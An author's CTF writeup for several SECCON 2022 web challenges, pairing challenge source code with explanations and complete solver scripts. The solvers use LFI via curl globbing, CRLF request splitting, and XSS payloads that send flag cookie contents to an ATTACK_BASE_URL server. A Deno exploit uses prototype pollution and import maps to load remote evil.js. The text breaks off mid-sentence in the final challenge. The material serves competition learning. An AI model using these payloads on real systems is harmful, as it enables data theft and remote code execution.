---
title: "SECCON CTF 2022 Quals: Author writeups - English"
thumbnail: /images/2022/20221118-seccon-top.png
date: 2022-11-18 23:00:00
tags:
    - CTF
description: Writeups for my challenges (skipinx, easylfi, bffcalc, piyosay, denobox, spanote, latexipy, txtchecker, and noiseccon) in SECCON CTF 2022 Quals.
---

Thank you for playing SECCON CTF 2022 Quals!
Just like [last year](https://blog.arkark.dev/2021/12/22/seccon/), I wrote some challenges for this CTF.

- 日本語writeupは[こちら](https://blog.arkark.dev/2022/11/18/seccon-ja/)！

My challenge list:

|Challenge|Category|Difficulty|Keywords|Solved|
|:-:|:-:|:-:|:-:|:-:|
|skipinx|web|wamup|query parser, DoS|102|
|easylfi|web|easy|curl, URL globbing, LFI|62|
|bffcalc|web|medium|CRLF injection, request splitting|41|
|piyosay|web|medium|Trusted Types, DOMPurify, RegExp|19|
|denobox|web|medium-hard|prototype pollution, import maps|1|
|spanote|web|hard|Chrome, disk cache, bfcache|1|
|latexipy|misc|easy|pyjail, magic comment|8|
|txtchecker|misc|medium|magic file, ReDoS|23|
|noiseccon|misc|medium-hard[^top-1]|Perlin noise|22|

[^top-1]: Because of my lack of consideration, many players solved this challenge by unintended solutions :cry:

I added the source code and author's solvers to [my-ctf-challenges](https://github.com/arkark/my-ctf-challenges) repository.

## [web] skipinx

- 102 teams solved / 100 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/skipinx

Description:

> ALL YOU HAVE TO DO IS SKIP NGINX
>
> - `http://skipinx.seccon.games:8080`

### Overview

This is a simple server-side challenge.

The sever returns a response of `Access here directly, not via nginx :(` for your request:
![](/images/2022/20221118-seccon-skipinx-01.png)

`nginx/default.conf`:
```nginx
server {
  listen 8080 default_server;
  server_name nginx;

  location / {
    set $args "${args}&proxy=nginx";
    proxy_pass http://web:3000;
  }
}
```
The nginx adds a query parameter `proxy=nginx` to each request, and proxies the request to the backend server.

`web/index.js`:
```javascript
const app = require("express")();

const FLAG = process.env.FLAG ?? "SECCON{dummy}";
const PORT = 3000;

app.get("/", (req, res) => {
  req.query.proxy.includes("nginx")
    ? res.status(400).send("Access here directly, not via nginx :(")
    : res.send(`Congratz! You got a flag: ${FLAG}`);
});

app.listen({ port: PORT, host: "0.0.0.0" }, () => {
  console.log(`Server listening at ${PORT}`);
});
```
The backend server returns a flag only if a request doesn't have `proxy=nginx`.

Can you access the backend server without going through nginx?

### Solution

Express uses qs as a default query parser:

- https://expressjs.com/en/api.html#app.set
    - > The extended query parser is based on qs.
- https://github.com/ljharb/qs

Also, Express uses default values for options on qs:

- Default options: https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L8-L25

Option `parameterLimit` specifies the maximum number of query parameters and the default value is `1000`.

The parameter is used in:
```javascript
// from: https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L54-L55
var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;
var parts = cleanStr.split(options.delimiter, limit);
```
As you can see, Express ignores parameters after a `parameterLimit`-th parameter.
Thus, if you send a request with more than 1000 query parameters, `proxy=nginx` is ignored.

### Solver

```python
import os
import httpx

BASE_URL = "http://skipinx.seccon.games:8080"

# ref. https://github.com/ljharb/qs/blob/v6.11.0/lib/parse.js#L21
PARAMETER_LIMIT = 1000

query = "proxy=something" + ("&"*(PARAMETER_LIMIT - 1))
res = httpx.get(f"{BASE_URL}/?{query}")
print(res.text)
```

### Flag

```
SECCON{sometimes_deFault_options_are_useful_to_bypa55}
```

## [web] easylfi

- 62 teams solved / 124 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/easylfi

Description:

> Can you read my secret?
>
> - `http://easylfi.seccon.games:3000`

### Overview

This is server-side challenge.

You access the server:
![](/images/2022/20221118-seccon-easylfi-01.png)

If you submit `test`, the server redirects to `/hello.html?%7Bname%7D=test`:
![](/images/2022/20221118-seccon-easylfi-02.png)

Source code (`web/app.py`):
```python
from flask import Flask, request, Response
import subprocess
import os

app = Flask(__name__)


def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid


def template(text: str, params: dict[str, str]) -> str:
    # A very simple template engine
    for key, value in params.items():
        if not validate(key):
            return f"Invalid key: {key}"
        text = text.replace(key, value)
    return text


@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response("Try harder")
    return response


@app.route("/")
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("

    try:
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout"

    if proc.returncode != 0:
        return "Something wrong..."
    return template(proc.stdout.decode(), request.args)
```

The goal is stealing a flag from `/flag.txt`.

### Solution

#### Step 1: path traversal

The server uses curl to read files:
```python
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
```

Unfortunately, path traversal to `/flag.txt` is prevented:
```python
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("
```

By the way, curl has a feature of [URL globbing](https://everything.curl.dev/cmdline/globbing), and you can access multiple resources at the same time.
You can bypass the above defense using this feature:
```sh
$ http "http://localhost:3000/.{.}/.{.}/flag.txt"
HTTP/1.1 200 OK
Connection: close
Content-Length: 10
Content-Type: text/html; charset=utf-8
Date: Sat, 05 Nov 2022 12:09:18 GMT
Server: Werkzeug/2.2.2 Python/3.10.8

Try harder
```

However, the following WAF hides the flag response:
```python
@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response("Try harder")
    return response
```

#### Step 2: bypassing WAF

The server returns a response after the following process:
```python
    return template(proc.stdout.decode(), request.args)
```

The implementation of the template engine is as follows:
```python
def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid


def template(text: str, params: dict[str, str]) -> str:
    # A very simple template engine
    for key, value in params.items():
        if not validate(key):
            return f"Invalid key: {key}"
        text = text.replace(key, value)
    return text
```

Is it possible to show the flag string without `SECCON` by abusing this template engine?

The first important point is that `validate("{")` is `True`. You can bypass it with this bug and URL globbing.

Example payload:

- URL: `file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}`
- params:
    ```json
    {
        "{name}": "{",
        "{": "}{",
        "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": ""
    }
    ```

The process in the template engine is as follows.

The initial state:
```
... snip ...
<body>
  <h1>Hello, {name}!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}
```

`"{name}"` → `"{"`:
```
... snip ...
<body>
  <h1>Hello, {!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON{real_flag}
```

`"{"` → `"}{"`:
```
... snip ...
<body>
  <h1>Hello, }{!</h1>
</body>
</html>
--_curl_--file:///app/public/../../flag.txt
SECCON}{real_flag}
```

`"{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}"` → `""`:
```
... snip ...
<body>
  <h1>Hello, }{real_flag}
```

### Solver

```python
import os
import httpx

BASE_URL = f"http://easylfi.seccon.games:3000"

res = httpx.get(
    BASE_URL + "/{.}./{.}./{app/public/hello.html,flag.txt}",
    params={
        "{name}": "{",
        "{": "}{",
        "{!</h1>\n</body>\n</html>\n--_curl_--file:///app/public/../../flag.txt\nSECCON}": "",
    },
)

print("SECCON" + res.text.split("<h1>Hello, }")[1])
```

### Flag

```
SECCON{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
```

## [web] bffcalc

- 41 teams solved / 149 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/bffcalc

Description:

> There is a simple calculator!
>
> - `http://bffcalc.seccon.games:3000`

### Overview

This web service is a simple calculator:

![](/images/2022/20221118-seccon-bffcalc-01.png)

`docker-copmose.yml`:
```yaml
version: "3"

services:
  nginx:
    build: ./nginx
    restart: always
    ports:
      - "3000:3000"
  bff:
    build: ./bff
    restart: always
  backend:
    build: ./backend
    restart: always
  report:
    build: ./report
    restart: always
  bot:
    build: ./bot
    restart: always
    environment:
      - FLAG=SECCON{dummydummy}
```

- `nginx`: It proxies requests to `bff` and `report`
- `bff`: It serves static files and proxies requests to `backend`.
- `backend`: It evaluate a simple expression and returns the result.

The server uses [cherrypy](https://github.com/cherrypy/cherrypy) as a framework. A bot sets a flag as a cookie value with a HttpOnly attribute.

### Solution

#### Step 1: XSS

Firstly, there is a trivial XSS vulnerability in `index.html`:
、`index.html`の
```javascript
        const result = await (await fetch("/api?expr=" + encodeURIComponent(expr))).text();
        document.getElementById("result").innerHTML = result || " ";
```

However, you cannot read the flag cookie since it has a HttpOnly attribute.

#### Step 2: CRLF injection

`bff`'s proxy process to `backend` is as follows:
```python
def proxy(req) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("backend", 3000))
    sock.settimeout(1)

    payload = ""
    method = req.method
    path = req.path_info
    if req.query_string:
        path += "?" + req.query_string
    payload += f"{method} {path} HTTP/1.1\r\n"
    for k, v in req.headers.items():
        payload += f"{k}: {v}\r\n"
    payload += "\r\n"

    sock.send(payload.encode())
    time.sleep(.3)
    try:
        data = sock.recv(4096)
        body = data.split(b"\r\n\r\n", 1)[1].decode()
    except (IndexError, TimeoutError) as e:
        print(e)
        body = str(e)
    return body
```
`bff` constructs HTTP requests and sends them using `socket`.

Herein, the process for headers in cherrypy is as follows:

- https://github.com/cherrypy/cherrypy/blob/v18.8.0/cherrypy/_cprequest.py#L727
- https://github.com/cherrypy/cherrypy/blob/v18.8.0/cherrypy/lib/httputil.py#L251

cherrypy decodes headers following [RFC 2047](https://www.rfc-editor.org/rfc/rfc2047.html). So, you can attack with CRLF injection by sending decoded `\r\n` on headers.

#### Step 3: HttpOnly cookie exposure

Is it possible to construct a request whose response includes the flag cookie with CRLF injection?

`backend` uses [waitress](https://github.com/Pylons/waitress) as a WSGI to cherrypy. The following implementation is important to solve this challenge:

- https://github.com/Pylons/waitress/blob/v2.1.2/src/waitress/parser.py#L436-L437

If the first line of a HTTP request is invalid, waitress returns the invalid HTTP method in the body. By abusing this behavior, you can steal the flag from the response body.

There are three points to steal the flag:

- HTTP request splitting with CRLF injection
- Adjusting a `Content-Length` value of the first splitted request so that the cookie value is at the position of the HTTP method of the second splitted request
- Adding another cookie so that the second request matches with the following regex:
    ```python
    # From: https://github.com/Pylons/waitress/blob/v2.1.2/src/waitress/parser.py#L409-L413
    first_line_re = re.compile(
        b"([^ ]+) "
        b"((?:[^ :?#]+://[^ ?#/]*(?:[0-9]{1,5})?)?[^ ]+)"
        b"(( HTTP/([0-9.]+))$|$)"
    )
    ```
    - E.g. `document.cookie = '/?a=b HTTP/1.1'`
    - Then, the first line is `flag=SECCON{real_flag}; /?a=b HTTP/1.1` and it matches with the regex.

### Solver

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const encode = (bs) => {
    // ref. https://www.rfc-editor.org/rfc/rfc2047.html#section-2
    charset = "iso-8859-1";
    encoding = "q";
    encoded_text = Array.from(Buffer.from(bs))
      .map((x) => "=" + Buffer.from([x]).toString("hex"))
      .join("");
    return `=?${charset}?${encoding}?${encoded_text}?=`;
  };

  const contentLength =
    "Accept: */*\r\nReferer: http://nginx:3000/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: "
      .length;
  const evilHeader = encode(`bbb\r\nContent-Length: ${contentLength}\r\n`);

  const evilJs = `
    const main = async () => {
      document.cookie = '/?a=b HTTP/1.1';

      const res = await fetch('/api?expr=1', {
        method: 'GET',
        headers: {
          'aaa': '${evilHeader}',
        },
      });
      location = '${ATTACK_BASE_URL}/?text=' + encodeURIComponent(await res.text());
    };
    main();
  `.replaceAll("\n", "");
  if (evilJs.includes('"')) {
    fail("Invalid evilJs");
  }

  const xssPayload = `<img src=0 onerror="${evilJs}">`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        expr: xssPayload,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const text = req.query.text;
    console.log(text); // Print a flag

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1000);
      await exploit();

      await sleep(5000);
      console.log("Failed");
      process.exit(1);
    }
  );
};
start();
```

### Flag

```
SECCON{i5_1t_p0ssible_tO_s7eal_http_only_cooki3_fr0m_XSS}
```

## [web] piyosay

- 19 teams solved / 210 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/piyosay

Description:

> I know the combination of DOMPurify and Trusted Types is a perfect defense for XSS attacks.
>
> - `http://piyosay.seccon.games:3000`

### Overview

![](/images/2022/20221118-seccon-piyosay-01.png)

- This is a client-side challenge.
- CSP: `trusted-types default dompurify; require-trusted-types-for 'script'`
- A bot's has a flag as a cookie value.

The essential code in this challenge is only the following part of `web/result.html`:
```html
<!DOCTYPE html>
<html>
<head>
  <!-- snip -->
</head>
<body style="padding: 3rem;">
  <!-- snip  -->

  <script>
    trustedTypes.createPolicy("default", {
      createHTML: (unsafe) => {
        return DOMPurify.sanitize(unsafe)
          .replace(/SECCON{.+}/g, () => {
            // Delete a secret in RegExp
            "".match(/^$/);
            return "SECCON{REDACTED}";
          });
      },
    });
  </script>
  <script>
    const get = (path) => {
      return path.split("/").reduce((obj, key) => obj[key], document.all);
    };

    const init = async () => {
      /* snip */
    };

    const main = async () => {
      const params = new URLSearchParams(location.search);

      const message = `${params.get("message")}${
        document.cookie.split("FLAG=")[1] ?? "SECCON{dummy}"
      }`;
      // Delete a secret in document.cookie
      document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
      get("message").innerHTML = message;

      const emoji = get(params.get("emoji"));
      get("message").innerHTML = get("message").innerHTML.replace(/{{emoji}}/g, emoji);
    };

    document.addEventListener("DOMContentLoaded", async () => {
      await init();
      await main();
    });
  </script>
</body>
</html>
```

### Solution

#### Step 1: XSS with bypassing Trusted Types

The settings of Trusted Types is as follows:
```javascript
    trustedTypes.createPolicy("default", {
      createHTML: (unsafe) => {
        return DOMPurify.sanitize(unsafe)
          .replace(/SECCON{.+}/g, () => {
            // Delete a secret in RegExp
            "".match(/^$/);
            return "SECCON{REDACTED}";
          });
      },
    });
```

For example, you can bypass it to XSS with the following payload:
```javascript
> createHTML('SECCON{x<p id="}<img src=0 onerror=console.log(1)>"></p>')
'SECCON{REDACTED}<img src=0 onerror=console.log(1)>"></p>'
```

However, you cannot steal a flag from `document.cookie` because the flag is deleted in:
```javascript
document.cookie = "FLAG=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
```

#### Step 2: RegExp in DOMPurify

By the way, what is the following line in `createHTML`?
```javascript
// Delete a secret in RegExp
"".match(/^$/);
```

JavaScript has interesting(?) behavior in RegExp:

- [`RegExp.input`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input)
- [`RegExp.lastMatch`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch)
- [`RegExp.lastParen`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastParen)
- [`RegExp.leftContext`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/leftContext)
- [`RegExp.rightContext`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/rightContext)
- [`RegExp.$1`-`RegExp.$9`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/n)

`"".match(/^$/)` is a process to delete values of the above static properties. If this line does not exist, you can steal the flag from `RegExp.input` with:
```javascript
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["input"]
```

By the way, DOMPurify uses regular expressions when it sanitizes strings:

- E.g.: https://github.com/cure53/DOMPurify/blob/2.4.0/src/purify.js#L957

```javascript
> DOMPurify.sanitize('x<script><SECCON{xxx}')
'x'
> RegExp.input
'<SECCON{xxx}'
> RegExp.rightContext
'ECCON{xxx}'
> document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
'ECCON{xxx}'
```

This fact is useful to solve this challenge.

#### Step 3: just a XSS puzzle game!

You are ready to steal the flag.

Example URL:
```javascript
  const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
  const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
  const url = `http://web:3000/result?${new URLSearchParams({
    emoji,
    message,
  })}`;
```

If you report this URL, the server of `ATTACK_BASE_URL` will receive `ECCON{real_flag} SECCON{REDACTED}">`.

### Solver

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT ?? "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const exploit = async () => {
  const emoji = "0/ownerDocument/defaultView/RegExp/rightContext";
  const message = `{{emoji}} S{{emoji}}<p id="}<img src=0 onerror=fetch(\`${ATTACK_BASE_URL}/?text=\`+encodeURIComponent(document.all.message.textContent))>"></p><script><`;
  const url = `http://web:3000/result?${new URLSearchParams({
    emoji,
    message,
  })}`;

  const res = await (
    await fetch(`${SECCON_BASE_URL}/report`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        url,
      }),
    })
  ).text();
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const text = req.query.text;

    // Print a flag
    console.log("S" + text);
    // -> SECCON{real_flag} SECCON{REDACTED}">

    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) {
        fastify.log.error(err);
        process.exit(1);
      }

      await sleep(1000);
      await exploit();

      await sleep(5000);
      console.log("Failed");
      process.exit(1);
    }
  );
};
start();
```

### Flag

```
SECCON{w0w_yoU_div3d_deeeeeep_iNto_DOMPurify}
```

## [web] denobox

- 1 teams solved / 500 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/denobox

Description:

> Your program runs in a sandbox!
>
> - `http://denobox.seccon.games:3000`

### Overview

This is a Deno sandbox challenge.

- The server-side language is Rust.
- The server creates a TypeScript program and executes it using `deno run` as a subprocess.
    - [Permission](https://deno.land/manual@v1.27.1/getting_started/permissions) option: `--allow-write=.`

You can generate a TypeScript program with user-defined parts under the constraints of a validator:
![](/images/2022/20221118-seccon-denobox-01.png)

You can execute your program with specified JSON as input data:
![](/images/2022/20221118-seccon-denobox-02.png)

You can get the JSON result of the execution:
![](/images/2022/20221118-seccon-denobox-03.png)

The `{{FLAG}}` in source code is replaced with a flag string:
```typescript
if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
}
```
The goal is to steal the flag string in this `if` statement.

### Solution

#### Step 1: prototype pollution

The validator limits user-defined parts by traversing AST of TypeScript.
Example limitation:
```rust
fn validate_identifier(ident: &Ident) -> Result<(), String> {
    // Limit available variables to `input` and `output` only.
    if ident.sym.eq("input") || ident.sym.eq("output") {
        Ok(())
    } else {
        Err(format!("{:?}", ident))
    }
}
```

```rust
fn validate_assign_expr(expr: &AssignExpr) -> Result<(), String> {
    (match expr.left.as_pat() {
        Some(Pat::Expr(expr)) => validate_expr(expr),
        _ => Err(format!("{:?}", expr.left)),
    })?;
    validate_expr(&expr.right)?;
    Ok(())
}
```

There is a trivial Prototype Pollution vulnerability. Also, unlike usual Prototype Pollution, you can pollute something by methods of some built-in Objects (E.g., `Object`, `String`, and `Array`).

By Prototype Pollution, can you do something in the following parts:
```typescript
if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
}

const filename = crypto.randomUUID().replaceAll("-", "") + ".json";
await Deno.writeTextFile(filename, JSON.stringify(output));
console.log(filename);
```

Interestingly, by the following pollution, you can specify an arbitrary string for `crypto.randomUUID().replaceAll("-", "")`:
```typescript
"".constructor.prototype.replaceAll = "".constructor.raw;
"".constructor.prototype.raw = input.filename;
```

- Ref: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/raw

So, you can specify the name of the output JSON file with a suffix `.json`.

#### Step 2: import maps in Deno

From v1.18, Deno has a feature of auto-discovery of the config file:

- https://deno.com/blog/v1.18#auto-discovery-of-the-config-file

In this challenge settings, if there is `deno.json` in the current directory, the `deno` command reads it as a config file. This is possible using the Prototype Pollution described in Step 1.

You will notice a interesting property `importMap` if you check the schema of the configuration:
```javascript
// From: https://deno.land/x/deno@v1.27.1/cli/schemas/config-file.v1.json
/* snip */
    "importMap": {
      "description": "The location of an import map to be used when resolving modules. If an import map is explicitly specified, it will override this value.",
      "type": "string"
    },
/* snip */
```

Import maps:

- https://github.com/WICG/import-maps
- https://deno.land/manual@v1.27.1/linking_to_external_code/import_maps

Using this property, you can assign `https://deno.land/std@0.161.0/crypto/mod.ts` into an arbitrary file. Of course, it includes your JavaScript file served on your server!

Thus, you can do RCE! However, note that there is a permission `--allow-write=.` and you cannot read the source code.

#### Step 3: JavaScript Proxy

The goal is to hook any process in the following:
```typescript
if ("{{FLAG}}" in output) {
  delete output["{{FLAG}}"];
}
```

It is possible using JavaScript Proxy:

- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Meta_programming
- https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy

### Solver

`evil.js`:
```javascript
export const crypto = {
  randomUUID: () => ({
    replaceAll: () => "dummy",
  }),
};

const proxy1 = new Proxy(
  {},
  {
    has(target, propertyKey) {
      console.log(propertyKey); // output a flag
      return Reflect.has(...arguments);
    },
  }
);

const proxy2 = new Proxy(
  {},
  {
    set(target, property, value, receiver) {
      Object.setPrototypeOf(value, proxy1);
      return Reflect.set(...arguments);
    },
  }
);

JSON.parse = () => proxy2;
```

`index.js`:
```javascript
const fastify = require("fastify")();
const fs = require("node:fs");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL = process.env.SECCON_BASE_URL || fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL = process.env.ATTACK_BASE_URL || fail("No ATTACK_BASE_URL");

const LISTEN_PORT = process.env.PORT || "8080";

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const source = `
  output.importMap = input.importMap;
  output.imports = input.imports;
  "".constructor.prototype.replaceAll = "".constructor.raw;
  "".constructor.prototype.raw = input.filename;

  input.key = output;
`;

const importMapJson = JSON.stringify({
  filename: "import_map",
  imports: {
    "https://deno.land/std@0.161.0/crypto/mod.ts": `${ATTACK_BASE_URL}/evil.js`,
  },
});

const denoJson = JSON.stringify({
  filename: "deno",
  importMap: "import_map.json",
});

const exploit = async () => {
  const path = await (
    await fetch(`${SECCON_BASE_URL}/`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        source,
      }),
    })
  ).text();

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: importMapJson,
    }),
  });

  await fetch(`${SECCON_BASE_URL}${path}/run`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      input: denoJson,
    }),
  });

  const flag = await (
    await fetch(`${SECCON_BASE_URL}${path}/run`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        input: "",
      }),
    })
  ).text();

  console.log(flag);
};

const start = async () => {
  const evilJs = fs.readFileSync("evil.js").toString();
  fastify.get("/evil.js", async (req, reply) => {
    return evilJs;
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err);

      await sleep(1000);
      await exploit();
      fastify.close();
    }
  );
};
start();
```

### Flag

```
SECCON{thE_denO_masc0t_dino5auR_staNding_in_tHe_s4ndbox}
```

ref. https://github.com/denoland/deno/blob/v1.27.1/README.md?plain=1#L6

## [web] spanote

- 1 teams solved / 500 points
- https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202211_SECCON_CTF_2022_Quals/web/spanote

Description:

> Single Page Application makes our note app simple.
>
> - `http://spanote.seccon.games:3000`

### Overview

There is a simple note application.

![](/images/2022/20221118-seccon-spanote-01.png)

Create a note:
![](/images/2022/20221118-seccon-spanote-02.png)

Delete a note:
![](/images/2022/20221118-seccon-spanote-03.png)

- The bot accesses a reported URL after creating a note with a flag string.
- There is no CSP, but it is seemingly impossible to do XSS:thinking:

### Solution

#### Step 1: Understanding cache behavior in Google Chrome

Let me get straight to the point, in my solution, you can XSS by abusing cache behavior in Google Chrome. To solve this challenge, you need to have some knowledge of cache behavior (or experiment it).

There are two impotant types of cache:

- back/forward cache (bfcache)
    - ref. https://web.dev/i18n/en/bfcache/
    - It stores a complete snapshot of a page **including the JavaScript heap**.
    - The cache is used for back/forward navigations.
- disk cache
    - ref. https://www.chromium.org/developers/design-documents/network-stack/disk-cache/
    - It stores a resource fetched from the web. The cache **doesn't include the JavaScript heap**.
    - The cache is also used for back/forward navigations to skip communication costs.

As a interesting point of disk cache, the cache includes not only the HTTP response rendered to a web page, but also those fetched with `fetch`. In other words, if you access the URL for a fetched resource, the browser will render the resource on the page.

There is another important point. If both disk cache and bfcache are valid for an accessed page at back/forward navigations, the bfcache has priority over the disk cache. So, it is necessary to have a situation where bfcache is disabled to trigger the above behavior of disk cache.

#### Step 2: Rendering a fetch response with disk cache

Let's try the interesting behavior in this challenge.

Firstly, you have to disable bfcache[^spanote-1]. There are many conditions where bfcache is disabled, the list is:

- https://source.chromium.org/chromium/chromium/src/+/main:out/mac-Debug/gen/third_party/blink/renderer/core/inspector/protocol/page.cc?q=BackForwardCacheNotRestoredReasonEnum%20&ss=chromium

The easy way is to use `RelatedActiveContentsExist`.

- `RelatedActiveContentsExist`: The page opend with `window.open()` and it has a reference of `window.opener`.
- ref. https://web.dev/articles/bfcache#avoid_windowopener_references

[^spanote-1]: In fact, you can skip this step because bfcache is disabled by [default options](https://github.com/puppeteer/puppeteer/blob/v19.2.0/packages/puppeteer-core/src/node/ChromeLauncher.ts#L175) of puppeteer.

Therefore, the following procedure reproduces the behavior:

1. Access a web page (E.g. `https://example.com`)
2. Execute `open("http://spanote.seccon.games:3000/api/token")`
    - ![](/images/2022/20221118-seccon-spanote-04.png)
    - The server returns a response with 500 status code.
3. In the opend tab, access `http://spanote.seccon.games:3000/`
    - ![](/images/2022/20221118-seccon-spanote-05.png)
    - Then, the response of `http://spanote.seccon.games:3000/api/token` is cached as a disk cache.
4. Execute `history.back()`
    - ![](/images/2022/20221118-seccon-spanote-06.png)
    - The cached JSON response is rendered on the page!

You can confirm that disk cache is used using DevTools in Google Chrome:
![](/images/2022/20221118-seccon-spanote-07.png)

#### Step 3: HTML rendering with handling Content-Type

This web service returns responses only with `application/json` or `application/octet-stream`. So you cannot do XSS by rendering them.

Herein, note that notes are served with [`@fastify/static`](https://github.com/fastify/fastify-static):
```javascript
  sendNote(reply, noteId) {
    return reply.sendFile(`db/${this.id}/${noteId}`);
  }
```

The implementation is as follows:

- https://github.com/fastify/fastify-static/blob/v6.5.0/index.js#L448
- https://github.com/broofa/mime/blob/main/types/standard.js

The Content-Type is defined according to the extension of a served file. The extension for `text/html` is `.html`.

By the way, there is a trivial CSRF vulnerability for two APIs to create/delete a note. So you can call them freely.

The API to delete a note is as follows:
```javascript
/* snip */

const validate = (id) => {
  if (typeof id !== "string") {
    throw Error(`Invalid id: ${id}`);
  }
  if (
    id.includes("..") ||
    id.includes("/") ||
    id.includes("\\") ||
    id.includes("%")
  ) {
    // No path traversal
    throw Error(`Invalid id: ${id}`);
  }
  return id;
};

/* snip */

class User {
  /* snip */

  async deleteNote(noteId) {
    await fs.writeFile(`db/${this.id}/${noteId}`, `deleted: ${noteId}`);
    return noteId;
  }

  /* snip */
}

/* snip */

fastify.post("/api/notes/delete", async (request, reply) => {
  const user = new User(request.session.userId);
  const noteId = validate(request.body.noteId);
  await user.deleteNote(noteId);
  return { noteId };
});

/* snip */
```

If you call the API with `noteId=<img src=0 onerror="alert(1)">.html`, Content-Type of the response for
```
